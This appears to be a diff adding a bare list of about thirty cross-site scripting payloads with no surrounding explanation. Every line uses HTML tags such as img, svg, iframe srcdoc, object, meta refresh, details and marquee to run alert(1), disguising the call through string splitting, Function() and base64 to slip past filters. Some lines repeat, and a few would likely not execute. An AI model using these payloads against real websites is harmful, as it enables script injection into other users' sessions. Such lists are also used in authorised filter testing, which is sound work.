@@ -1,0 +1,31 @@
+```html
+<img src=x onerror=(window['ale'+'rt'])(1)>
+<svg><script>self['ale'+'rt'](1)</script></svg>
+<iframe srcdoc="<svg onload=top['ale'+'rt'](1)></svg>"></iframe>
+<meta http-equiv="refresh" content="0;url=javascript:self['ale'+'rt'](1)">
+<object data="data:text/html,<script>parent['al'+'ert'](1)</script>"></object>
+<marquee onstart="this.stop();(window['ale'+'rt'])(1)"></marquee>
+<svg><foreignObject><div xmlns="http://www.w3.org/1999/xhtml"><img src=x onerror=(window['al'+'ert'])(1)></div></foreignObject></svg>
+<details open ontoggle="Function('ale'+'rt(1)')()"></details>
+<iframe srcdoc="<body onload=top['al'+'ert'](1)></body>"></iframe>
+<object data='javascript:parent["ale"+"rt"](1)'></object>
+<meta charset="x-user-defined" http-equiv="refresh" content="0;url=javascript:(window['al'+'ert'])(1)">
+<img style="display:block" src=x onerror="(window['ale'+'rt'])(1)">
+<svg><desc><![CDATA[<script>top['al'+'ert'](1)</script>]]></desc></svg>
+<iframe srcdoc="<svg onload='window[\"al\"+\"ert\"](1)'></svg>"></iframe>
+<object data="data:text/html;base64,PHNjcmlwdD5wYXJlbnRbJ2FsZXJ0J10oMSk8L3NjcmlwdD4="></object>
+<details open ontoggle='(window.Function(atob("YWxlcnQoMSk=")))()'></details>
+<marquee onbounce="(window['al'+'ert'])(1)"></marquee>
+<meta http-equiv="refresh" content="0;url=javascript:self['al'+'ert'](1)">
+<object data="javascript:parent['ale'+'rt'](1)"></object>
+<iframe srcdoc="<body onload='window[\"ale\"+\"rt\"](1)'></body>"></iframe>
+<img src=x onerror="this.onerror=null;window['al'+'ert'](1)">
+<svg><foreignObject><div xmlns="http://www.w3.org/1999/xhtml"><iframe srcdoc='<script>top["al"+"ert"](1)</script>'></iframe></div></foreignObject></svg>
+<iframe srcdoc="<svg onload=parent['ale'+'rt'](1)></svg>"></iframe>
+<object type="text/html" data="javascript:parent['ale'+'rt'](1)"></object>
+<details open ontoggle='Function("window[\"al\"+\"ert\"](1)")()'></details>
+<marquee onstart="window['ale'+'rt'](1)"></marquee>
+<svg><desc><![CDATA[<script>top['al'+'ert'](1)</script>]]></desc></svg>
+<img src=x onerror="this.src='';(window['ale'+'rt'])(1)">
+<iframe srcdoc="<body onload='top[\"al\"+\"ert\"](1)'></body>"></iframe>
+```
